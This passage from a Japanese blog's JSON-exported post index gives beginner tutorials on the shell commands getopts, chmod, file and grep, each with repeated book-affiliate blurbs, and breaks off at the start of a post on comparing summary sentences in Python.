getoptsとよく似た名前で用途も同じ「getopt」コマンド（/usr/bin/getopt）があります。getoptコマンドはgetoptsとは異なり、「\u0026ndash;」から始まるロングオプションも扱うことができます。 getoptsコマンドの書式 getopts オプション文字列 変数名\ngetoptsコマンドの主なオプション getoptsにはオプションはありません。なお、オプション文字列の先頭に「:」記号を入れるかどうかによって、エラーメッセージ表示の有無を変更できます。\nオプション 意味 : エラーメッセージの表示の有無 ヒント 一覧のオプションは一部です。 $ man getopts などで、getoptsの使い方を確認してください。 getoptsコマンド詳細説明 オプションを解析する オプション「-a」「-b」「-c」を使用し、それぞれのオプションに応じてメッセージを表示します。\n#!/bin/bash while getopts abc OPT; do case $OPT in a) echo \u0026#34;[-a] が指定された\u0026#34;;; b) echo \u0026#34;[-b] が指定された\u0026#34;;; c) echo \u0026#34;[-c] が指定された\u0026#34;;; *) echo \u0026#34;該当なし OPT=$OPT \u0026#34;;; esac done while getopts abc OPT; do\nの abc は、オプションの種類が a,b,cの３種類あることを明示的に指定しています。\nOPTは $OPT変数で、 a,b,cがそれぞれ順に代入されます。\n$ bash getopts.sh -a [-a] が指定された $ bash getopts.sh -ab [-a] が指定された [-b] が指定された $ bash getopts.sh -a -b [-a] が指定された [-b] が指定された $ bash getopts.sh -abc -d [-a] が指定された [-b] が指定された [-c] が指定された $ bash getopts.sh -abc -d [-a] が指定された [-b] が指定された [-c] が指定された getopts.sh: 不正なオプションです -- d 該当なし OPT=? 以下のオプションは用意されていないことからエラー表示となります。\n$ bash getopts.sh -abc -d [-a] が指定された [-b] が指定された [-c] が指定された getopts.sh: 不正なオプションです -- d 該当なし OPT=? エラーメッセージを表示しない getoptsに指定していないオプションを使用すると、画面1のように「不正なオプションです \u0026ndash; d」、あるいは「illegal option \u0026ndash; d」のようなメッセージを表示します。\nこのようなgetoptsのエラーメッセージを表示したくない場合は、「getopts :abc OPT」のように、オプション文字列の先頭に「:」記号を入れます。\n#!/bin/bash while getopts :abc OPT; do case $OPT in a) echo \u0026#34;[-a] が指定された\u0026#34;;; b) echo \u0026#34;[-b] が指定された\u0026#34;;; c) echo \u0026#34;[-c] が指定された\u0026#34;;; *) echo \u0026#34;該当なし OPT=$OPT \u0026#34;;; esac done エラーが表示される getopts01.sh\n$ bash getopts01.sh -abc -d [-a] が指定された [-b] が指定された [-c] が指定された getopts01: 不正なオプションです -- d 該当なし OPT=? エラーが表示されない getopts02.sh\n$ bash getopts02.sh -abc -d [-a] が指定された [-b] が指定された [-c] が指定された 該当なし OPT=? 引数付きのオプションを使用する 「-f ファイル名」のように、引数を取るオプションを解析したい場合は、オプション文字の後に「:」記号を付けます。オプションの引数は、組み込み変数「OPTARG」で参照できます。\n#!/bin/bash while getopts :a:bc: OPT; do case $OPT in a) echo \u0026#34;[-a] が指定された(引数=$OPTARG)\u0026#34;;; b) echo \u0026#34;[-b] が指定された\u0026#34;;; c) echo \u0026#34;[-c] が指定された(引数=$OPTARG)\u0026#34;;; :) echo \u0026#34;$OPTARGに引数が指定されていません\u0026#34;;; ?) echo \u0026#34;$OPTARGは定義されていません\u0026#34;;; esac done 実行結果\n$ bash getopts03.sh -a filename -b -c 100 [-a] が指定された 引数=filename [-b] が指定された [-c] が指定された 引数=100 $ 解説\n:a:bc:　について\n:a エラー表示をしないというオプションとなります。 a: -a が指定された場合は引数に数値または文字列を受け取ります。 c: -c が指定された場合は引数に数値または文字列を受け取ります。 ヒント アホか。というくらいまぎらわしくてわかりにくい設計で笑えます。一体どこの誰がこんなわかりにくい仕様にしたのでしょう。 ヒント とにかくシェルクスクリプトで起動パラメータを設定することができました。便利なツールをたくさん作ってください。では 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-07T11:27:03+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-07-01-getopts-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-07-01-getopts-suzuki/","title":"（１１）【getopts】シェルスクリプトコマンド活用紹介"},{"content":"chmodコマンド パーミッションを表すアルファベットと数値の意味 パーミッションを変更する パーミッションの変更内容を確認するには？ chmodコマンド概要 ファイルやディレクトリにアクセスできるかどうかは、ファイルの「パーミッション（許可属性）」によって決まります。このパーミッションを変更するコマンドが「chmod」です。\nchmodコマンドの書式 chmod [オプション] モード ファイル1 ファイル2 ファイル3……\nchmodコマンドの主なオプション オプション 意味 -R ファイルとディレクトリを再帰的に変更する -v 処理した内容を出力する -c 変更が行われた場合のみ処理内容を出力する -f ほとんどのエラーメッセージを出力しない ヒント 一覧のオプションは一部です。 $ man chmod などで、chmodの使い方を確認してください。 chmodコマンド詳細説明 パーミッションを表すアルファベットと数値の意味 記号 数字 意味 r 4 読み w 2 書き x 1 実行 - 0 拒否 具体的に以下のように表示される場合、「所有者」「所有グループ」「それ以外」の３桁で表されます。\nrw-rw-r\u0026ndash; 664\nrwxr-xr-x 755\nすくなくとも自分自身はおおむね「所有者」となりますので、\nrw-rw-r\u0026ndash; 664\nの場合は、所有者（自分自身）は、rw- 6 ですので、\n読み・書きはできるものの実行はできない（実行の必要がない）ファイル・ディレクトリということになります。\nrwxr-xr-x 755\nの場合は、所有者（自分自身）は、rwx 7 ですので、\n読み・書き・実行が可能なファイル・ディレクトリであるということになります。\nパーミッションを変更する いろいろな方法があります。\n一般的には（なにが一般的かもわかりませんが）以下の通りとなります。\nsample.txtのパーミッションを664に変更する\n$ chmod 664 sample.txt sample.txtのパーミッションを755に変更する\n$ chmod 755 sample.txt パーミッションの変更内容を確認するには？ chmodコマンドで「-v」オプションを指定すると、コマンドの実行内容が分かるようになります。パーミッションが変更されなかった場合も、現状がどのようになっているかが分かるように表示されます。\n$ chmod -v 755 sample.txt \u0026#39;sample.txt\u0026#39; のモードを 0664 (rw-rw-r--)から 0775 (rwxrwxr-x)へ変更しました ヒント $ chmod コマンドはとても重要、かつセキュリティ上注意が必要なコマンドです。なんでもかんでも777にしておくという大馬鹿ものが後を絶ちませんが、やめましょう。 ヒント -v オプションは常につけて実行しましょう。何を実行したのかを履歴に残しておくことで振り返って確認することができます。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-06T10:12:50+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-06-01-chmod-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-06-01-chmod-suzuki/","title":"（１０）【chmod】シェルスクリプトコマンド活用紹介"},{"content":"fileコマンド ファイルの形式を表示する ファイルのリストから調べる シンボリックリンクの参照先を調べる 圧縮されているファイルを調べる fileコマンドと組み合わせてスクリプトファイルを一覧表示する whichコマンドと組み合わせてコマンドのファイル形式を調べる fileコマンド概要 「file」は、ファイル形式を調べるためのコマンドです。「file ファイル名」で、ファイルの形式が表示されます。テキストファイルの場合は、文字コードが表示されます。\nヒント fileコマンドを使わないとできないことがあります。ファイルの拡張子をみて画像ファイルであり、そのファイルタイプはjpgまたはgifという見分けをしますが、それはあくまで見た目の話で、ファイルの内容を確認するためのコマンドがfileコマンドになります。 fileコマンドの書式 file [オプション] ファイル1 ファイル2 ファイル3……\nfileコマンドの主なオプション オプション 意味 -f リスト\t検査するファイルの名前をリストファイルから読み込む -L シンボリックリンクの参照先を調べる -z 圧縮ファイルの中も検査する -b 出力行の最初にファイル名を表示しない -N 出力を整列するためのファイル名への空白の追加を行わない ヒント 一覧のオプションは一部です。 $ man file などで、fileの使い方を確認してください。 fileコマンド詳細説明 ファイルの形式を表示する システムメッセージを表示する\n$ file sample.jpg ヒント データファイルの場合は「.jpg」や「.mp3」といった拡張子で判断してしまうのが一般的ですが、fileコマンドの場合は拡張子ではなく、あくまでも“ファイルの内容”から判断します ファイルのリストから調べる 「-f」オプションで、ファイルの一覧を指定することができます。例えば、Linuxの設定ファイル「/etc/shells」にはインストールされているシェルがリストアップされていますが、「file -f /etc/shells」で、それぞれのシェルのファイル形式を調べることができます。\n$ file -f /etc/shell シンボリックリンクの参照先を調べる 「-L」オプションで、シンボリックリンクのリンク先を調べることができます。例えば、先ほどの実行結果から「/bin/csh」は、tcshへのシンボリックリンクであることが分かりました。「file -L /bin/csh」で、リンク先であるtcshのファイル形式が表示されます。\n$ file -L /bin/tcsh 圧縮されているファイルを調べる 「-z」オプションで、圧縮されているファイルの元の形式を調べることができます。\nbash-5.1$ file /usr/local/bin/openmpi-1.8.3.tar.gz /usr/local/bin/openmpi-1.8.3.tar.gz: gzip compressed data, last modified: Thu Sep 25 14:12:57 2014, max compression, from Unix bash-5.1$ ヒント $ man file などで、fileの使い方を確認してください。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-05T10:22:08+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-05-01-file-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-05-01-file-suzuki/","title":"（９）【file】シェルスクリプトコマンド活用紹介"},{"content":"grepコマンド コマンドの実行結果から必要な箇所だけを抽出する 単語単位で検索する 前後の行も表示する 行番号付きで表示する 複数の文字列を指定して検索する 複数の文字列を指定して検索する（正規表現） 検索文字列をファイルから読み込む どちらも含む行を探したい場合 文字列を含まない行を対象にする grepコマンド概要 「grep」コマンドは、ファイル中の「文字列（パターン）」が含まれている行を表示するコマンドで、UNIX/Linuxで、最も頻度高く利用されているコマンドの一つです。\n文章中に検索したい文字列の位置や頻出回数を確認する\nディレクトリ中のファイル一覧を作成し、そのファイル一覧から、該当するファイル名を探索する。\nヒント 抽出した結果をさらに「パイプ｜コマンド」で絞り込んだり、その結果を別のファイルに出力したりすることも簡単にできます。 grepコマンドの書式 grep [オプション] 検索パターン ファイル\nコマンド | grep [オプション] 検索パターン\ngrepコマンドの主なオプション オプション 意味 -i 大文字と小文字を区別しない -v パターンに一致しない行を表示する -n 行番号を併せて表示する -C 一致した行の前後の行も表示する -e 検索パターンを指定する -f ファイルに書かれているパターンを検索する ヒント 一覧のオプションは一部です。 $ man grep などで、grepの使い方を確認してください。 grepコマンド詳細説明 コマンドの実行結果から必要な箇所だけを抽出する 「dmesg」コマンド（起動時のシステムメッセージを再表示するコマンド）の実行結果から、grepコマンドで“volume”という文字列を含む行だけを表示したい場合は「dmesg | grep volume」と指定します\nシステムメッセージを表示する\n$ dmesg システムメッセージの出力から「volume」を含む行を抽出する\n$ dmesg | grep volume 大文字と小文字を「-iオプション」を付与して区別しないで抽出する\n$ dmesg | grep -i volume ヒント dmesg コマンドは、システムメッセージを表示するコマンドです。 単語単位で検索する 「volume」という文字列を検索したい場合、、検索結果には「volume」と「vboxvolume」が表示される場合もあります。“volumeという単語のみ”を検索対象としたい場合には、「-w」オプション（\u0026ndash;word-regexp）を使用します\n単語単位で検索する\n$ dmesg | grep -i -w volume 前後の行も表示する 文字列を検索する際には、該当する行の前後も表示されていると分かりやすい場合があります。例えば、前後2行ずつ表示したい場合は、「-2」のように数字で指定します。これは「-C（\u0026ndash;context=）」オプションと同じです。\n$ dmesg | grep -w -C2 volume ヒント ログなどでの利用は効果的ではありませんが、ドキュメント内を検索する場合に、GoogleのSnippetのように前後の文章が表示されることで、よりわかりやすくなります。さらに次の項目では、検索結果の評判号を表示させることもできます。 行番号付きで表示する grepコマンドでの検索結果に行番号を付けて表示したい場合は、「-n」オプション（\u0026ndash;line-number）を使用します。「行番号:」のように表示されますが、前後の行も併せて表示している場合は、前後の行は「行番号-」のように「-」記号で、該当する行は「:」記号で示されます。\n$ dmesg | grep -w -C2 -n volume 複数の文字列を指定して検索する grepコマンドで「volumeまたはkeybagを含む行を検索」のように、複数の文字列を検索したい場合には、「-e」オプションを付けて、それぞれが「検索パターン」であることを明示します。\n$ dmesg | grep -i -e keybag -e volume 複数の文字列を指定して検索する 複数の文字列を検索したい場合、正規表現で“または”という意味の「|」記号を使って指定することもできます。\n$ dmesg | grep -i \u0026#34;keybag\\|volume\u0026#34; ヒント ここでは OR 条件で抽出することを目的としています。AND条件で抽出する場合は、grep コマンドを「|」パイプコマンドで連結させます。 どちらの検索ワードも含む行\n$ dmesg | grep -i volume | grep -i keybag 検索文字列をファイルから読み込む 検索したい文字列が常に決まっている場合や、他のコマンドで単語をリストアップしているなどで、検索文字列のリストがあるような場合、「-f」オプションでリストのファイルを指定するとよいでしょう。\n$ cat wordlist keybag volume $ dmesg | grep -i -f wordlist ヒント この使い方は意外と知られていないのです。一般的にはwordlistをシェルスクリプトであらかじめ作成しておき、while read line; do などで wordlistを順番にgrepコマンドに渡す手法が多いです。 :\u0026gt; wordlist echo \u0026#34;keybag\u0026#34; \u0026gt;\u0026gt; wordlist; echo \u0026#34;volume\u0026#34; \u0026gt;\u0026gt; wordlist; cat wordlist | while read line; do echo \u0026#34;$line での検索\u0026#34;; dmesg | grep \u0026#34;$line\u0026#34; ; echo \u0026#34;\u0026#34;; done どちらも含む行を探したい場合 「どちらの検索ワードも含む行」としたい場合は、検索結果をさらにgrepするのが簡単です。\n$ dmesg | grep -i volume $ dmesg | grep -i keybag # どちらの検索ワードも含む行 $ dmesg | grep -i volume | grep -i keybag 文字列を含まない行を対象にする grepコマンドで「～を含まない行」だけを表示したい場合は「-v」オプション（「\u0026ndash;invert-match」オプション）を使います。\n# keybag を含みvolumeを含まない検索結果 $ dmesg | grep -i keybag | grep -v volume ヒント -v オプションはgrepコマンドのオプションの中で最も強力で利用頻度が高いです。「パターンに一致しない行を表示する」という意味合いとなります。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-04T13:21:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-04-01-grep-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-04-01-grep-suzuki/","title":"（８）【grep】シェルスクリプトコマンド活用紹介"},{"content":"pythonで自然言語解析してみよう 新聞記事の要約を試みています。要約の文字数が指定されているので文抽出型の要約だけですと指定文字数よりオーバーすることがあります。\nこれを文生成型の要約を補完的に適用することによって文字数を指定文字数まで調整できるようなものを作りたいというのが最終目標です。\n最終目標に向けて前処理をコツコツしてきたいと思います。\nまずは、教師データとして、元の文章とお手本の要約した文章があるとして、文単位で比較していき似ているけどちょっと違う文を抽出してみたいと思います。\n元の文章 国際パラリンピック委員会（ＩＰＣ）は３日、声明を発表し、前日２日に中立選手としての北京パラリンピック（４日開幕）への参加を容認したＲＰＣ（ロシアパラリンピック委員会）、ベラルーシの選手について、一転して出場を認めないことを発表した。ＩＰＣは声明で「ＲＰＣおよびベラルーシの選手のエントリーを拒否することを決定しました」と発表した。パーソンズ会長のコメントとして「圧倒的な数の関係者と連絡をとりオープンに議論した。彼らは私たちが決定を再考しなければ、２０２２年パラリンピック大会に重大な結果をもたらす可能性が高いと語った。複数のＮＰＣ、中には政府、チーム、アスリートからの働きかけを受けていたが、競技に参加しなさそうでもあった」と、撤回に至った経緯を説明した。 要約文 国際パラリンピック委員会（ＩＰＣ）は３日、声明を発表し、前日２日に中立選手としての北京パラリンピック（４日開幕）への参加を容認したＲＰＣ（ロシアパラリンピック委員会）、ベラルーシの選手について、一転して出場を認めないことを発表した。ＩＰＣが「ＲＰＣおよびベラルーシの選手のエントリーを拒否することを決定しました」と発表した。 元の文章と要約文を比較してみると、元の文章は全部で4文ありますが、要約文は上の2文を抽出しています。そして2文目の「ＩＰＣは声明で」が「ＩＰＣが」に修正されています。\nこれを、修正のあった文だけ抽出し、さらに修正内容も出力してみたいと思います。\nこの例だと\n元の文章 ＩＰＣは声明で「ＲＰＣおよびベラルーシの選手のエントリーを拒否することを決定しました」と発表した。 要約文 ＩＰＣが「ＲＰＣおよびベラルーシの選手のエントリーを拒否することを決定しました」と発表した。 修正内容 「は声明で」-\u0026gt;「が」 包含関係にあるものはスキップしたい 似ているけどちょっと違うという文をピックアップしたいので要約が元の文章の文の数だけ減らしただけのものはスキップしたいと思います。\n例えば、以下の例だと要約文は元の文章の第2文までをそのまま抜粋しただけなので教師データからは除外したいと思います。\nプログラムでは、要約文と元の文章が包含関係にあるものはスキップするという処理を入れたいと思います。\n元の文章 国際パラリンピック委員会（ＩＰＣ）は３日、声明を発表し、前日２日に中立選手としての北京パラリンピック（４日開幕）への参加を容認したＲＰＣ（ロシアパラリンピック委員会）、ベラルーシの選手について、一転して出場を認めないことを発表した。ＩＰＣは声明で「ＲＰＣおよびベラルーシの選手のエントリーを拒否することを決定しました」と発表した。パーソンズ会長のコメントとして「圧倒的な数の関係者と連絡をとりオープンに議論した。彼らは私たちが決定を再考しなければ、２０２２年パラリンピック大会に重大な結果をもたらす可能性が高いと語った。複数のＮＰＣ、中には政府、チーム、アスリートからの働きかけを受けていたが、競技に参加しなさそうでもあった」と、撤回に至った経緯を説明した。 要約文 国際パラリンピック委員会（ＩＰＣ）は３日、声明を発表し、前日２日に中立選手としての北京パラリンピック（４日開幕）への参加を容認したＲＰＣ（ロシアパラリンピック委員会）、ベラルーシの選手について、一転して出場を認めないことを発表した。ＩＰＣは声明で「ＲＰＣおよびベラルーシの選手のエントリーを拒否することを決定しました」と発表した。 python で包含関係を調べる良い方法がないかなと調べたところ in 演算子というのを使うのが手っ取り早そうです。\na in b とすると a が bに包含されている場合はTrueをそうでない場合はFalseを返します。\nプログラムは以下になります。\nsummary=\u0026#34;　国際パラリンピック委員会（ＩＰＣ）は３日、声明を発表し、前日２日に中立選手としての北京パラリンピック（４日開幕）への参加を容認したＲＰＣ（ロシアパラリンピック委員会）、ベラルーシの選手について、一転して出場を認めないことを発表した。ＩＰＣは声明で「ＲＰＣおよびベラルーシの選手のエントリーを拒否することを決定しました」と発表した。 \u0026#34; original=\u0026#34;　